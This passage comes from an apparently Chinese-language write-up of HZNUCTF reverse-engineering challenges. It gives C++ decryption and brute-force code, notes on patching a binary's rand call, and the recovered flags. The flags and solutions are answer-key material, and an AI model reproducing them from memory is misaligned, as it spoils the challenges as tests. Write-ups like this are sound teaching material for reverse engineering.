    &#x2F;&#x2F; 四个字节一组进行翻转
    for (int j &#x3D; 0; j &lt; 32; j +&#x3D; 4)
    &#123;
        auto tmp &#x3D; *((char *)buffer + j + 3) | (*((char *)buffer + j + 2) &lt;&lt; 8) | (*((char *)buffer + j + 1) &lt;&lt; 16) | (*((char *)buffer + j) &lt;&lt; 24);
        *(int *)(buffer + j) &#x3D; tmp;
    &#125;
    printf(&quot;%.32s\n&quot;, buffer);

    return 0;
&#125;</code></pre>

<p>HZNUCTF{ae6-9f57-4b74-b423-98eb}</p>
<h3 id="randomsystem"><a href="#randomsystem" class="headerlink" title="randomsystem"></a>randomsystem</h3><p>第一部分是输入64字节大小的0101二进制数据，然后进行转换到Hex（倒序），再倒序回来拆分半个字节转到ascii字符。</p>
<p>如：0101001001100101第一次函数后是0x65，0x52然后再翻转拆分为ascii字符’5’,’2’,’6’,’5’。</p>
<p><img src="/images/1744633170177-11.png" alt="img" loading="lazy"></p>
<p>根据判断判断出的字符可知要输入的是52 65 56 65 52 65 53 65的二进制数据。</p>
<pre class="language-none"><code class="language-none">0101001001100101010101100110010101010010011001010101001101100101</code></pre>

<p>底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。</p>
<p>第一部分用固定种子的随机数初始化了一个v18数值列表。</p>
<p><img src="/images/1744633170177-12.png" alt="img" loading="lazy"></p>
<p>然后进行四次加密。</p>
<p><img src="/images/1744633170177-13.png" alt="img" loading="lazy"></p>
<p>Enc1是用随机数初始化的列表进行打乱输入字符串的顺序。</p>
<p><img src="/images/1744633170177-14.png" alt="img" loading="lazy"></p>
<p>Enc2是将输入字符串转存到另一个二维数组。</p>
<p><img src="/images/1744633170177-15.png" alt="img" loading="lazy"></p>
<p>第三个函数是将之前输入转换后的Key存到”Str”中，实际值就是<strong>ReVeReSe</strong></p>
<p>第四个函数是用一个全局的矩阵乘上输入数据。</p>
<p><img src="/images/1744633170178-16.png" alt="img" loading="lazy"></p>
<p>最后和Key进行循环异或加密。</p>
<p><img src="/images/1744633170178-17.png" alt="img" loading="lazy"></p>
<p>所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。</p>
<p>Enc1由于是对称的可以直接用原函数，Enc3也可以直接用原函数把矩阵数据改成逆矩阵就是解密。</p>
<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

void Enc1(char *Str, int *RdList)
&#123;
    char v3;   &#x2F;&#x2F; [esp+D3h] [ebp-1Dh]
    size_t i;  &#x2F;&#x2F; [esp+DCh] [ebp-14h]
    size_t v5; &#x2F;&#x2F; [esp+E8h] [ebp-8h]

    v5 &#x3D; 64;
    for (i &#x3D; 0;; ++i)
    &#123;
        auto result &#x3D; v5 &gt;&gt; 1;
        if (i &gt;&#x3D; v5 &gt;&gt; 1)
            break;
        if (RdList[i] &gt;&#x3D; 0 &amp;&amp; RdList[i] &lt; v5)
        &#123;
            v3 &#x3D; Str[i];
            Str[i] &#x3D; Str[v5 - RdList[i] - 1];
            Str[v5 - RdList[i] - 1] &#x3D; v3;
        &#125;
    &#125;
&#125;

void Enc2(char *a1, char *a2)
&#123;
    int j;  &#x2F;&#x2F; [esp+D0h] [ebp-20h]
    int i;  &#x2F;&#x2F; [esp+DCh] [ebp-14h]
    int v4; &#x2F;&#x2F; [esp+E8h] [ebp-8h]

    v4 &#x3D; 0;
    for (i &#x3D; 0; i &lt; 8; ++i)
    &#123;
        for (j &#x3D; 0; j &lt; 8; ++j)
            *&amp;a1[32 * i + 4 * j] &#x3D; a2[v4++];
    &#125;
&#125;

unsigned int dword_3FC368[] &#x3D; &#123;
    0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000,
    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000001, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000001,
    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001&#125;;

int inv[] &#x3D; &#123;
    1,-4,1,-2,0,5,-2,3,
    0,3,-1,1,0,-3,1,-2,
    0,-2,1,-1,0,2,-1,2,
    0,0,0,1,0,-1,0,0,
    0,-4,1,-1,1,4,-2,3,
    0,1,0,0,0,0,0,-1,
    0,1,0,0,0,-1,1,-1,
    0,-1,0,0,0,1,0,1,
&#125;;

int Enc3(int *a1, char *a2, char *a3)
&#123;
    int result; &#x2F;&#x2F; eax
    int k;      &#x2F;&#x2F; [esp+D0h] [ebp-20h]
    int j;      &#x2F;&#x2F; [esp+DCh] [ebp-14h]
    int i;      &#x2F;&#x2F; [esp+E8h] [ebp-8h]

    for (i &#x3D; 0; i &lt; 8; ++i)
    &#123;
        for (j &#x3D; 0; j &lt; 8; ++j)
        &#123;
            a3[32 * i + 4 * j] &#x3D; 0;
            for (k &#x3D; 0; k &lt; 8; ++k)
                a3[32 * i + 4 * j] +&#x3D; *&amp;a2[32 * k + 4 * j] * a1[8 * i + k];
        &#125;
        result &#x3D; i + 1;
    &#125;
    return result;
&#125;

void Dec2(char *a1, char *a2)
&#123;
    int j;
    int i;
    int v4;

    v4 &#x3D; 0;
    for (i &#x3D; 0; i &lt; 8; ++i)
    &#123;
        for (j &#x3D; 0; j &lt; 8; ++j)
            a2[v4++] &#x3D; a1[32 * i + 4 * j];
    &#125;
&#125;

unsigned char EncFlag[256] &#x3D; &#123;
    0x78, 0x01, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0xA9, 0x00, 0x00, 0x00, 0xF5, 0x01, 0x00, 0x00,
    0x15, 0x01, 0x00, 0x00, 0x49, 0x01, 0x00, 0x00, 0x8B, 0x00, 0x00, 0x00, 0x56, 0x01, 0x00, 0x00,
    0x7C, 0x01, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,
    0x7D, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00, 0x5B, 0x01, 0x00, 0x00, 0x33, 0x01, 0x00, 0x00,
    0x07, 0x01, 0x00, 0x00, 0x67, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0xE4, 0x01, 0x00, 0x00,
    0x36, 0x01, 0x00, 0x00, 0x4D, 0x01, 0x00, 0x00, 0x5A, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00,
    0x96, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x58, 0x01, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xFA, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xAD, 0x00, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00, 0x7B, 0x01, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0x24, 0x01, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00,
    0xC5, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xC5, 0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00,
    0xC6, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0xCF, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00,
    0xCA, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00,
    0xC1, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xB5, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x61, 0x01, 0x00, 0x00,
    0x99, 0x00, 0x00, 0x00, 0x65, 0x01, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x97, 0x00, 0x00, 0x00&#125;;

int main()
&#123;
    &#x2F;&#x2F; First: 0101001001100101010101100110010101010010011001010101001101100101
    srand(2025);
    int RdList[0x80]&#123;&#125;;
    bool v16 &#x3D; true;
    int rd&#123;&#125;;
    for (int i &#x3D; 0; i &lt; 32; i++)
    &#123;
        do
        &#123;
            rd &#x3D; rand() % 32;
            rd &amp;&#x3D; 0x8000001F;
            v16 &#x3D; 1;
            for (int j &#x3D; 0; j &lt; i; j++)
            &#123;
                if (RdList[j] &#x3D;&#x3D; rd)
                &#123;
                    v16 &#x3D; 0;
                    break;
                &#125;
            &#125;
        &#125; while (!v16);
        RdList[i] &#x3D; rd;
    &#125;

    char Key[] &#x3D; &quot;ReVeReSe&quot;;
    int count &#x3D; 0;
    for (int i &#x3D; 0; i &lt; 256; i +&#x3D; 4)
    &#123;
        *(DWORD *)(EncFlag + i) ^&#x3D; Key[count % 8];
        count++;
    &#125;
    unsigned char Buffer_Dec[256]&#123;&#125;;

    Enc3((int *)inv, (char *)EncFlag, (char *)Buffer_Dec);
    Dec2((char *)Buffer_Dec, (char *)Buffer_Dec);
    Enc1((char *)Buffer_Dec, RdList);

    printf(&quot;HZNUCTF&#123;%.64s&#125;\n&quot;, Buffer_Dec);
    return 0;
&#125;</code></pre>

<p>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</p>
<h3 id="conforand（非预期）"><a href="#conforand（非预期）" class="headerlink" title="conforand（非预期）"></a>conforand（非预期）</h3><p>从srand查看交叉调用，发现是当前时间戳随机，并非伪随机。</p>
<p><img src="/images/1744633170178-18.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170178-19.png" alt="img" loading="lazy"></p>
<p>查看rand交叉调用，发现是再init_sbox函数中调用，并且只获取了一次随机数，应该是利用rand的数值参与sbox生成。</p>
<p><img src="/images/1744633170178-20.png" alt="img" loading="lazy"></p>
<p>那么这边的思路就是爆破随机数，但由于是ollvm编译的，代码混乱，使用d810去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。</p>
<p>接下来是先检验加密对称性，运行发现是会输出加密后的内容。</p>
<p>检验步骤：</p>
<ol>
<li>随便输入一串字符串</li>
<li>断点rand，修改rand返回值rax寄存器为0。</li>
<li>得到输出加密内容。</li>
<li>再次输入字符串，断点在main的rc4调用处，将传参的字符串patch为刚刚程序输出的加密后字节数据。</li>
<li>断点rand，修改rand返回值rax寄存器为0。</li>
<li>观察输出加密内容是否为原字符串数据。</li>
</ol>
<p>Patch前：</p>
<p><img src="/images/1744633170178-21.png" alt="img" loading="lazy"></p>
<p>Patch后：</p>
<p><img src="/images/1744633170178-22.png" alt="img" loading="lazy"></p>
<p>发现是对称的，同一个rand值，加密函数也可以用于解密。</p>
<p><img src="/images/1744633170178-23.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170178-24.png" alt="img" loading="lazy"></p>
<p>开始Patch原程序流程，用于爆破，将init函数作为hook跳转函数。</p>
<p>将rand调用改成jmp到init函数。</p>
<p><img src="/images/1744633170178-25.png" alt="img" loading="lazy"></p>
<p>init函数头直接改成如下，将0x4068D3地址的数值存到eax，然后再跳转回去，达到一个hook修改rand值结果的效果，所以我们直接加载elf通过修改0x4068D3数值，调用rc4加密来爆破解密密文。</p>
<p><img src="/images/1744633170178-26.png" alt="img" loading="lazy"></p>
<p>这边使用这个库加载elf进行调用call：<a href="https://github.com/IchildYu/load-elf">https://github.com/IchildYu/load-elf</a> （河豚鱼，神）</p>
<p>爆破代码（Key是在原init函数中进行初始化的明文，可以直接找到）：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;include&#x2F;load_elf.h&quot;
#include &quot;include&#x2F;logger.h&quot;
#include &quot;include&#x2F;breakpoint.h&quot;

int main() 
&#123;
        const char* path &#x3D; &quot;.&#x2F;conforand&quot;;
        void* base &#x3D; load_elf(path);

        __uint64_t  (*rc4)(unsigned char*, unsigned long long, unsigned char*, unsigned long long) &#x3D; get_symbol_by_offset(base,0x413170);

        unsigned char key[]&#x3D;&quot;JustDoIt!&quot;;

        for(int i&#x3D;0; i&lt;1000000; i++)
        &#123;
                unsigned char EncData[]&#x3D;&#123;0x83,0x1e,0x9c,0x48,0x7a,0xfa,0xe8,0x88,0x36,0xd5,0x0a,0x08,0xf6,0xa7,0x70,0x0f,0xfd,0x67,0xdd,0xd4,0x3c,0xa7,0xed,0x8d,0x51,0x10,0xce,0x6a,0x9e,0x56,0x57,0x83,0x56,0xe7,0x67,0x9a,0x67,0x22,0x24,0x6e,0xcd,0x2f&#125;;

                *(unsigned int*)(0x4068D3) &#x3D; i;

                rc4(EncData,42,key,9);
                
                if(EncData[0] &#x3D;&#x3D; &#39;H&#39; 
                        &amp;&amp; EncData[1] &#x3D;&#x3D; &#39;Z&#39;
                        &amp;&amp; EncData[2] &#x3D;&#x3D; &#39;N&#39;)
                &#123;
                        printf(&quot;Seed:%d\n&quot;,i);
                        printf(&quot;%.42s\n&quot;,EncData);
                        break;
                &#125;
        &#125;
        return 0;
&#125;</code></pre>

<p><img src="/images/1744633170178-27.png" alt="img" loading="lazy"></p>
<p>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</p>
<h3 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h3><p>输入的字符串经过unhex、拆分字节，改变顺序。</p>
<p>如：<strong>11</strong>-&gt;<strong>0x31 0x31</strong>-&gt;<strong>‘3’ ‘1’ ‘3’ ‘1’</strong>-&gt;<strong>‘3’ ‘3’ ‘1’ ‘1’</strong></p>
<p>是两个字节为一组进行变换的。</p>
<p>然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是**”HZNUCTF{“**字串。</p>
<p><img src="/images/1744633170178-28.png" alt="img" loading="lazy"></p>
<p>主加密函数，发现只走这上面的部分。</p>
<p><img src="/images/1744633170178-29.png" alt="img" loading="lazy"></p>
<p>第一个函数是用**”HZNUCTF{“**字串生成的一串数据，64个整数数据。</p>
<p>第二个函数是将输入数据8个字节为一组进行加密。</p>
<p>加密流程：</p>
<ol>
<li>4个字节为一组进行翻转</li>
<li>8字节加密</li>
<li>4个字节为一组进行翻转</li>
</ol>
<p><img src="/images/1744633170178-30.png" alt="img" loading="lazy"></p>
<p>加密可以看出是DES加密算法，是对称的，key就是刚刚生成的64个整数数值的前32个，那么可以知道后32个就是解密用的key，直接copy该函数，解密时用生成的后32个整数key即可解密。</p>
<p><img src="/images/1744633170178-31.png" alt="img" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

unsigned int s1[64] &#x3D; &#123;
    0x01010400, 0x00000000, 0x00010000, 0x01010404, 0x01010004, 0x00010404, 0x00000004, 0x00010000,
    0x00000400, 0x01010400, 0x01010404, 0x00000400, 0x01000404, 0x01010004, 0x01000000, 0x00000004,
    0x00000404, 0x01000400, 0x01000400, 0x00010400, 0x00010400, 0x01010000, 0x01010000, 0x01000404,
    0x00010004, 0x01000004, 0x01000004, 0x00010004, 0x00000000, 0x00000404, 0x00010404, 0x01000000,
    0x00010000, 0x01010404, 0x00000004, 0x01010000, 0x01010400, 0x01000000, 0x01000000, 0x00000400,
    0x01010004, 0x00010000, 0x00010400, 0x01000004, 0x00000400, 0x00000004, 0x01000404, 0x00010404,
    0x01010404, 0x00010004, 0x01010000, 0x01000404, 0x01000004, 0x00000404, 0x00010404, 0x01010400,
    0x00000404, 0x01000400, 0x01000400, 0x00000000, 0x00010004, 0x00010400, 0x00000000, 0x01010004&#125;;
unsigned int s2[64] &#x3D; &#123;
    0x80108020, 0x80008000, 0x00008000, 0x00108020, 0x00100000, 0x00000020, 0x80100020, 0x80008020,
    0x80000020, 0x80108020, 0x80108000, 0x80000000, 0x80008000, 0x00100000, 0x00000020, 0x80100020,
    0x00108000, 0x00100020, 0x80008020, 0x00000000, 0x80000000, 0x00008000, 0x00108020, 0x80100000,
    0x00100020, 0x80000020, 0x00000000, 0x00108000, 0x00008020, 0x80108000, 0x80100000, 0x00008020,
    0x00000000, 0x00108020, 0x80100020, 0x00100000, 0x80008020, 0x80100000, 0x80108000, 0x00008000,
    0x80100000, 0x80008000, 0x00000020, 0x80108020, 0x00108020, 0x00000020, 0x00008000, 0x80000000,
    0x00008020, 0x80108000, 0x00100000, 0x80000020, 0x00100020, 0x80008020, 0x80000020, 0x00100020,
    0x00108000, 0x00000000, 0x80008000, 0x00008020, 0x80000000, 0x80100020, 0x80108020, 0x00108000&#125;;
unsigned int s3[64] &#x3D; &#123;
    0x00000208, 0x08020200, 0x00000000, 0x08020008, 0x08000200, 0x00000000, 0x00020208, 0x08000200,
    0x00020008, 0x08000008, 0x08000008, 0x00020000, 0x08020208, 0x00020008, 0x08020000, 0x00000208,
    0x08000000, 0x00000008, 0x08020200, 0x00000200, 0x00020200, 0x08020000, 0x08020008, 0x00020208,
    0x08000208, 0x00020200, 0x00020000, 0x08000208, 0x00000008, 0x08020208, 0x00000200, 0x08000000,
    0x08020200, 0x08000000, 0x00020008, 0x00000208, 0x00020000, 0x08020200, 0x08000200, 0x00000000,
    0x00000200, 0x00020008, 0x08020208, 0x08000200, 0x08000008, 0x00000200, 0x00000000, 0x08020008,
    0x08000208, 0x00020000, 0x08000000, 0x08020208, 0x00000008, 0x00020208, 0x00020200, 0x08000008,
    0x08020000, 0x08000208, 0x00000208, 0x08020000, 0x00020208, 0x00000008, 0x08020008, 0x00020200&#125;;
unsigned int s4[64] &#x3D; &#123;
    0x00802001, 0x00002081, 0x00002081, 0x00000080, 0x00802080, 0x00800081, 0x00800001, 0x00002001,
    0x00000000, 0x00802000, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00800080, 0x00800001,
    0x00000001, 0x00002000, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002001, 0x00002080,
    0x00800081, 0x00000001, 0x00002080, 0x00800080, 0x00002000, 0x00802080, 0x00802081, 0x00000081,
    0x00800080, 0x00800001, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00000000, 0x00802000,
    0x00002080, 0x00800080, 0x00800081, 0x00000001, 0x00802001, 0x00002081, 0x00002081, 0x00000080,
    0x00802081, 0x00000081, 0x00000001, 0x00002000, 0x00800001, 0x00002001, 0x00802080, 0x00800081,
    0x00002001, 0x00002080, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002000, 0x00802080&#125;;
unsigned int s5[64] &#x3D; &#123;
    0x00000100, 0x02080100, 0x02080000, 0x42000100, 0x00080000, 0x00000100, 0x40000000, 0x02080000,
    0x40080100, 0x00080000, 0x02000100, 0x40080100, 0x42000100, 0x42080000, 0x00080100, 0x40000000,
    0x02000000, 0x40080000, 0x40080000, 0x00000000, 0x40000100, 0x42080100, 0x42080100, 0x02000100,
    0x42080000, 0x40000100, 0x00000000, 0x42000000, 0x02080100, 0x02000000, 0x42000000, 0x00080100,
    0x00080000, 0x42000100, 0x00000100, 0x02000000, 0x40000000, 0x02080000, 0x42000100, 0x40080100,
    0x02000100, 0x40000000, 0x42080000, 0x02080100, 0x40080100, 0x00000100, 0x02000000, 0x42080000,
    0x42080100, 0x00080100, 0x42000000, 0x42080100, 0x02080000, 0x00000000, 0x40080000, 0x42000000,
    0x00080100, 0x02000100, 0x40000100, 0x00080000, 0x00000000, 0x40080000, 0x02080100, 0x40000100&#125;;
unsigned int s6[64] &#x3D; &#123;
    0x20000010, 0x20400000, 0x00004000, 0x20404010, 0x20400000, 0x00000010, 0x20404010, 0x00400000,
    0x20004000, 0x00404010, 0x00400000, 0x20000010, 0x00400010, 0x20004000, 0x20000000, 0x00004010,
    0x00000000, 0x00400010, 0x20004010, 0x00004000, 0x00404000, 0x20004010, 0x00000010, 0x20400010,
    0x20400010, 0x00000000, 0x00404010, 0x20404000, 0x00004010, 0x00404000, 0x20404000, 0x20000000,
    0x20004000, 0x00000010, 0x20400010, 0x00404000, 0x20404010, 0x00400000, 0x00004010, 0x20000010,
    0x00400000, 0x20004000, 0x20000000, 0x00004010, 0x20000010, 0x20404010, 0x00404000, 0x20400000,
    0x00404010, 0x20404000, 0x00000000, 0x20400010, 0x00000010, 0x00004000, 0x20400000, 0x00404010,
    0x00004000, 0x00400010, 0x20004010, 0x00000000, 0x20404000, 0x20000000, 0x00400010, 0x20004010&#125;;
unsigned int s7[64] &#x3D; &#123;
    0x00200000, 0x04200002, 0x04000802, 0x00000000, 0x00000800, 0x04000802, 0x00200802, 0x04200800,
    0x04200802, 0x00200000, 0x00000000, 0x04000002, 0x00000002, 0x04000000, 0x04200002, 0x00000802,
    0x04000800, 0x00200802, 0x00200002, 0x04000800, 0x04000002, 0x04200000, 0x04200800, 0x00200002,
    0x04200000, 0x00000800, 0x00000802, 0x04200802, 0x00200800, 0x00000002, 0x04000000, 0x00200800,
    0x04000000, 0x00200800, 0x00200000, 0x04000802, 0x04000802, 0x04200002, 0x04200002, 0x00000002,
    0x00200002, 0x04000000, 0x04000800, 0x00200000, 0x04200800, 0x00000802, 0x00200802, 0x04200800,
    0x00000802, 0x04000002, 0x04200802, 0x04200000, 0x00200800, 0x00000000, 0x00000002, 0x04200802,
    0x00000000, 0x00200802, 0x04200000, 0x00000800, 0x04000002, 0x04000800, 0x00000800, 0x00200002&#125;;
unsigned int s8[64] &#x3D; &#123;
    0x10001040, 0x00001000, 0x00040000, 0x10041040, 0x10000000, 0x10001040, 0x00000040, 0x10000000,
    0x00040040, 0x10040000, 0x10041040, 0x00041000, 0x10041000, 0x00041040, 0x00001000, 0x00000040,
    0x10040000, 0x10000040, 0x10001000, 0x00001040, 0x00041000, 0x00040040, 0x10040040, 0x10041000,
    0x00001040, 0x00000000, 0x00000000, 0x10040040, 0x10000040, 0x10001000, 0x00041040, 0x00040000,
    0x00041040, 0x00040000, 0x10041000, 0x00001000, 0x00000040, 0x10040040, 0x00001000, 0x00041040,
    0x10001000, 0x00000040, 0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x00040000, 0x10001040,
    0x00000000, 0x10041040, 0x00040040, 0x10000040, 0x10040000, 0x10001000, 0x10001040, 0x00000000,
    0x10041040, 0x00041000, 0x00041000, 0x00001040, 0x00001040, 0x00040040, 0x10000000, 0x10041000&#125;;
unsigned short word_7FF65FC70900[8] &#x3D; &#123;
    0x0080, 0x0040, 0x0020, 0x0010, 0x0008, 0x0004, 0x0002, 0x0001&#125;;

unsigned int dword_7FF65FC70910[24] &#x3D; &#123;
    0x00800000, 0x00400000, 0x00200000, 0x00100000, 0x00080000, 0x00040000, 0x00020000, 0x00010000,
    0x00008000, 0x00004000, 0x00002000, 0x00001000, 0x00000800, 0x00000400, 0x00000200, 0x00000100,
    0x00000080, 0x00000040, 0x00000020, 0x00000010, 0x00000008, 0x00000004, 0x00000002, 0x00000001&#125;;
unsigned char byte_7FF65FC70970[56] &#x3D; &#123;
    0x38, 0x30, 0x28, 0x20, 0x18, 0x10, 0x08, 0x00, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01,
    0x3A, 0x32, 0x2A, 0x22, 0x1A, 0x12, 0x0A, 0x02, 0x3B, 0x33, 0x2B, 0x23, 0x3E, 0x36, 0x2E, 0x26,
    0x1E, 0x16, 0x0E, 0x06, 0x3D, 0x35, 0x2D, 0x25, 0x1D, 0x15, 0x0D, 0x05, 0x3C, 0x34, 0x2C, 0x24,
    0x1C, 0x14, 0x0C, 0x04, 0x1B, 0x13, 0x0B, 0x03&#125;;
unsigned char byte_7FF65FC709A8[16] &#x3D; &#123;
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10&#125;;

void __fastcall des_encrypt(unsigned int *a1, DWORD *a2)
&#123;
    unsigned int left &#x3D; a1[1];
    unsigned int right &#x3D; a1[0];

    unsigned int temp &#x3D; (left ^ (right &gt;&gt; 4)) &amp; 0xF0F0F0F;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 4) ^ right;

    temp &#x3D; (left ^ (right &gt;&gt; 16)) &amp; 0x0000FFFF;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 16) ^ right;

    temp &#x3D; (right ^ (left &gt;&gt; 2)) &amp; 0x33333333;
    right &#x3D; temp ^ right;
    left &#x3D; (temp &lt;&lt; 2) ^ left;

    temp &#x3D; (right ^ (left &gt;&gt; 8)) &amp; 0x00FF00FF;
    right &#x3D; temp ^ right;
    left &#x3D; (((temp &lt;&lt; 8) ^ left) &gt;&gt; 31) | (2 * ((temp &lt;&lt; 8) ^ left));

    temp &#x3D; (left ^ right) &amp; 0xAAAAAAAA;
    left &#x3D; temp ^ left;
    right &#x3D; ((temp ^ right) &gt;&gt; 31) | (2 * (temp ^ right));

    for (int i &#x3D; 0; i &lt; 8; i++)
    &#123;
        temp &#x3D; *a2++ ^ ((left &gt;&gt; 4) | (left &lt;&lt; 28));
        unsigned int result1 &#x3D; s1[(temp &gt;&gt; 24) &amp; 0x3F] |
                               s3[(temp &gt;&gt; 16) &amp; 0x3F] |
                               s5[(temp &gt;&gt; 8) &amp; 0x3F] |
                               s7[temp &amp; 0x3F];
        temp &#x3D; *a2++ ^ left;

        right ^&#x3D; s2[(temp &gt;&gt; 24) &amp; 0x3F] |
                 s4[(temp &gt;&gt; 16) &amp; 0x3F] |
                 s6[(temp &gt;&gt; 8) &amp; 0x3F] |
                 s8[temp &amp; 0x3F] |
                 result1;

        temp &#x3D; *a2++ ^ ((right &gt;&gt; 4) | (right &lt;&lt; 28));
        result1 &#x3D; s1[(temp &gt;&gt; 24) &amp; 0x3F] |
                  s3[(temp &gt;&gt; 16) &amp; 0x3F] |
                  s5[(temp &gt;&gt; 8) &amp; 0x3F] |
                  s7[temp &amp; 0x3F];

        temp &#x3D; *a2++ ^ right;
        left ^&#x3D; s2[(temp &gt;&gt; 24) &amp; 0x3F] |
                s4[(temp &gt;&gt; 16) &amp; 0x3F] |
                s6[(temp &gt;&gt; 8) &amp; 0x3F] |
                s8[temp &amp; 0x3F] |
                result1;
    &#125;
    left &#x3D; (left &gt;&gt; 1) | (left &lt;&lt; 31);
    temp &#x3D; (left ^ right) &amp; 0xAAAAAAAA;
    left &#x3D; temp ^ left;
    right &#x3D; ((temp ^ right) &gt;&gt; 1) | ((temp ^ right) &lt;&lt; 31);

    temp &#x3D; (left ^ (right &gt;&gt; 8)) &amp; 0xFF00FF;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 8) ^ right;

    temp &#x3D; (left ^ (right &gt;&gt; 2)) &amp; 0x33333333;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 2) ^ right;

    temp &#x3D; (right ^ (left &gt;&gt; 16)) &amp; 0xFFFF;
    right &#x3D; temp ^ right;
    left &#x3D; (temp &lt;&lt; 16) ^ left;

    temp &#x3D; (right ^ (left &gt;&gt; 4)) &amp; 0x0F0F0F0F;

    a1[0] &#x3D; (temp &lt;&lt; 4) ^ left;
    a1[1] &#x3D; temp ^ right;
&#125;

int main()
&#123;
    unsigned int key[64] &#x3D; &#123;
        0x2C0B3C36, 0x09221A0A, 0x2829051D, 0x09123B0D, 0x2C091B18, 0x0512011F, 0x09292E17, 0x07122920,
        0x090D1703, 0x0514372E, 0x0915123C, 0x27100E27, 0x01050927, 0x25150D29, 0x13151F32, 0x24112618,
        0x03052031, 0x34312B37, 0x13043A05, 0x3C19151B, 0x23063B3E, 0x34293830, 0x03062108, 0x380B3F2A,
        0x260E063D, 0x3009141B, 0x0E223D3D, 0x300B0124, 0x062A1700, 0x11093D14, 0x0E22262B, 0x1208083E,
        0x0E22262B, 0x1208083E, 0x062A1700, 0x11093D14, 0x0E223D3D, 0x300B0124, 0x260E063D, 0x3009141B,
        0x03062108, 0x380B3F2A, 0x23063B3E, 0x34293830, 0x13043A05, 0x3C19151B, 0x03052031, 0x34312B37,
        0x13151F32, 0x24112618, 0x01050927, 0x25150D29, 0x0915123C, 0x27100E27, 0x090D1703, 0x0514372E,
        0x09292E17, 0x07122920, 0x2C091B18, 0x0512011F, 0x2829051D, 0x09123B0D, 0x2C0B3C36, 0x09221A0A&#125;;

    unsigned int data[64] &#x3D; &#123;
        0x00000084, 0x0000008B, 0x00000003, 0x00000022, 0x00000014, 0x000000BE, 0x000000DF, 0x00000075,
        0x000000B3, 0x000000D5, 0x00000076, 0x0000006F, 0x000000CD, 0x0000002A, 0x0000005D, 0x000000D7,
        0x0000004D, 0x000000B2, 0x0000005F, 0x00000006, 0x00000098, 0x0000009D, 0x0000003E, 0x000000A8,
        0x000000F7, 0x00000023, 0x000000F2, 0x0000008B, 0x000000F2, 0x00000054, 0x00000065, 0x0000007A,
